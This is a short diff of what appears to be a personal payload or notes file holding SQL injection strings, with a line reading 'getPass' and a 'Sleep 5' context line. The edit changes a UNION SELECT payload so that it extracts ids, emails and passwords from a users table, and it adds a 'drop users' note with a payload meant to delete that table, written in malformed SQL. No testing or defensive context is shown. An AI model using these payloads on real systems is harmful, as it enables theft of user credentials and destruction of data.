@@ -12,4 +12,9 @@ Sleep 5
 
 getPass
 
-' UNION SELECT id, null, password FROM users;--
+' UNION SELECT id, email, password FROM users;--
+
+drop users
+
+' UNION DROP TABLE users;
+
